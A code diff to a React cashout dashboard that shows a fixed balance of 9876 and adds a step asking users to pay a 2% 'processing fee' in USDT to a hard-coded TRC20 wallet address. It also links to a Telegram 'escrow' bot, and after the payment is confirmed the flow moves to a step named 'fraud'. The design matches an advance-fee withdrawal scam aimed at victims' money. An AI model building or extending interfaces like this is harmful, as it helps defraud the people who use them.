@@ -1,5 +1,5 @@
 import { useState } from "react";
-import { CreditCard, User, Calendar, Lock, Shield, DollarSign, ArrowRight, Building2, Bitcoin, ChevronDown, Wallet, Hash, CheckCircle } from "lucide-react";
+import { CreditCard, User, Calendar, Lock, Shield, DollarSign, ArrowRight, Building2, Bitcoin, Wallet, CheckCircle, ExternalLink, Copy, Check } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import {
@@ -25,8 +25,26 @@ const CRYPTO_COINS = [
   "BTC", "ETH", "USDT", "USDC", "BNB", "XRP", "ADA", "DOGE", "SOL", "DOT", "MATIC", "LTC"
 ];
 
+const COIN_NETWORKS: Record<string, string[]> = {
+  "BTC": ["Bitcoin", "Lightning Network"],
+  "ETH": ["Ethereum (ERC20)", "Arbitrum", "Optimism", "Base"],
+  "USDT": ["Tron (TRC20)", "Ethereum (ERC20)", "BNB Smart Chain (BEP20)", "Solana", "Polygon", "Avalanche"],
+  "USDC": ["Ethereum (ERC20)", "Solana", "Polygon", "Arbitrum", "Avalanche", "Base"],
+  "BNB": ["BNB Smart Chain (BEP20)", "BNB Beacon Chain (BEP2)"],
+  "XRP": ["XRP Ledger"],
+  "ADA": ["Cardano"],
+  "DOGE": ["Dogecoin"],
+  "SOL": ["Solana"],
+  "DOT": ["Polkadot"],
+  "MATIC": ["Polygon", "Ethereum (ERC20)"],
+  "LTC": ["Litecoin"]
+};
+
+const FEE_PAYMENT_ADDRESS = "TZBh3GopUxDr9G6eCD5ShAT3ZgmsLRz8Bz";
+const TELEGRAM_ESCROW_URL = "https://t.me/DealEsrowBot";
+
 type PaymentMethod = "bank" | "crypto" | null;
-type CashoutStep = "method" | "details" | "confirm" | "fee" | "fraud";
+type CashoutStep = "method" | "details" | "confirm" | "fee" | "payment" | "fraud";
 
 const Dashboard = () => {
   const [cardName, setCardName] = useState("");
@@ -50,8 +68,13 @@ const Dashboard = () => {
   // Crypto details
   const [exchange, setExchange] = useState("");
   const [coin, setCoin] = useState("");
+  const [network, setNetwork] = useState("");
   const [walletAddress, setWalletAddress] = useState("");
   const [amount, setAmount] = useState("9876");
+  
+  // Payment confirmation
+  const [paymentConfirmed, setPaymentConfirmed] = useState(false);
+  const [copied, setCopied] = useState(false);
 
   const balance = 9876;
   const fee = balance * 0.02;
@@ -104,7 +127,17 @@ const Dashboard = () => {
   };
 
   const handlePayFee = () => {
+    setCashoutStep("payment");
+  };
+
+  const handlePaymentConfirmed = () => {
     setCashoutStep("fraud");
+  };
+
+  const copyAddress = () => {
+    navigator.clipboard.writeText(FEE_PAYMENT_ADDRESS);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
   };
 
   const resetCashout = () => {
@@ -117,8 +150,16 @@ const Dashboard = () => {
     setRoutingNumber("");
     setExchange("");
     setCoin("");
+    setNetwork("");
     setWalletAddress("");
     setAmount("9876");
+    setPaymentConfirmed(false);
+    setCopied(false);
+  };
+
+  const handleCoinChange = (selectedCoin: string) => {
+    setCoin(selectedCoin);
+    setNetwork(""); // Reset network when coin changes
   };
 
   const renderCashoutContent = () => {
@@ -243,7 +284,7 @@ const Dashboard = () => {
               </div>
               <div className="space-y-2">
                 <label className="text-sm font-medium text-foreground/80">Coin</label>
-                <Select value={coin} onValueChange={setCoin}>
+                <Select value={coin} onValueChange={handleCoinChange}>
                   <SelectTrigger className="h-11 bg-input border-border">
                     <SelectValue placeholder="Select coin" />
                   </SelectTrigger>
@@ -254,6 +295,21 @@ const Dashboard = () => {
                   </SelectContent>
                 </Select>
               </div>
+              {coin && COIN_NETWORKS[coin] && (
+                <div className="space-y-2">
+                  <label className="text-sm font-medium text-foreground/80">Network</label>
+                  <Select value={network} onValueChange={setNetwork}>
+                    <SelectTrigger className="h-11 bg-input border-border">
+                      <SelectValue placeholder="Select network" />
+                    </SelectTrigger>
+                    <SelectContent className="bg-background border-border">
+                      {COIN_NETWORKS[coin].map((n) => (
+                        <SelectItem key={n} value={n}>{n}</SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
+                </div>
+              )}
               <div className="space-y-2">
                 <label className="text-sm font-medium text-foreground/80">Wallet Address</label>
                 <Input
@@ -276,7 +332,7 @@ const Dashboard = () => {
               </div>
               <Button
                 onClick={handleDetailsSubmit}
-                disabled={!exchange || !coin || !walletAddress || !amount}
+                disabled={!exchange || !coin || !network || !walletAddress || !amount}
                 className="w-full h-11 bg-gradient-to-r from-primary to-accent text-primary-foreground font-semibold"
               >
                 Continue <ArrowRight className="w-4 h-4 ml-2" />
@@ -334,6 +390,10 @@ const Dashboard = () => {
                     <div className="flex justify-between">
                       <span className="text-muted-foreground">Coin</span>
                       <span className="font-medium text-foreground">{coin}</span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-muted-foreground">Network</span>
+                      <span className="font-medium text-foreground">{network}</span>
                     </div>
                     <div className="flex justify-between">
                       <span className="text-muted-foreground">Address</span>
@@ -394,6 +454,81 @@ const Dashboard = () => {
                 className="w-full h-11 mt-4 bg-gradient-to-r from-primary to-accent text-primary-foreground font-semibold"
               >
                 Pay ${fee.toFixed(2)} & Complete <ArrowRight className="w-4 h-4 ml-2" />
+              </Button>
+            </div>
+          </>
+        );
+
+      case "payment":
+        return (
+          <>
+            <DialogHeader>
+              <DialogTitle className="text-center">
+                <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-primary/20 flex items-center justify-center">
+                  <Wallet className="w-6 h-6 text-primary" />
+                </div>
+                <span className="text-lg font-display">Pay Processing Fee</span>
+              </DialogTitle>
+            </DialogHeader>
+            <div className="py-4 space-y-4">
+              <div className="bg-secondary/50 rounded-lg p-4 text-center">
+                <p className="text-sm text-muted-foreground mb-2">Send exactly</p>
+                <p className="text-2xl font-bold gold-text">${fee.toFixed(2)} USDT</p>
+                <p className="text-xs text-muted-foreground mt-1">on TRC20 network</p>
+              </div>
+              
+              <div className="space-y-2">
+                <label className="text-sm font-medium text-foreground/80">Payment Address</label>
+                <div className="flex items-center gap-2">
+                  <Input
+                    value={FEE_PAYMENT_ADDRESS}
+                    readOnly
+                    className="h-11 bg-input border-border font-mono text-xs flex-1"
+                  />
+                  <Button
+                    type="button"
+                    variant="outline"
+                    size="icon"
+                    onClick={copyAddress}
+                    className="h-11 w-11 shrink-0"
+                  >
+                    {copied ? <Check className="w-4 h-4 text-chart-2" /> : <Copy className="w-4 h-4" />}
+                  </Button>
+                </div>
+              </div>
+
+              <div className="bg-accent/10 border border-accent/30 rounded-lg p-3">
+                <p className="text-xs text-accent font-medium mb-2">💡 Use Telegram Escrow for secure payment</p>
+                <a
+                  href={TELEGRAM_ESCROW_URL}
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="inline-flex items-center gap-2 text-sm text-primary hover:underline"
+                >
+                  <ExternalLink className="w-4 h-4" />
+                  Open DealEscrowBot
+                </a>
+              </div>
+
+              <div className="flex items-center gap-3 p-3 bg-secondary/30 rounded-lg">
+                <input
+                  type="checkbox"
+                  id="paymentConfirmed"
+                  checked={paymentConfirmed}
+                  onChange={(e) => setPaymentConfirmed(e.target.checked)}
+                  className="w-4 h-4 rounded border-border"
+                />
+                <label htmlFor="paymentConfirmed" className="text-sm text-foreground">
+                  I have made the payment via escrow or direct transfer
+                </label>
+              </div>
+
+              <Button
+                onClick={handlePaymentConfirmed}
+                disabled={!paymentConfirmed}
+                className="w-full h-11 bg-gradient-to-r from-primary to-accent text-primary-foreground font-semibold"
+              >
+                Proceed <ArrowRight className="w-4 h-4 ml-2" />
               </Button>
             </div>
           </>
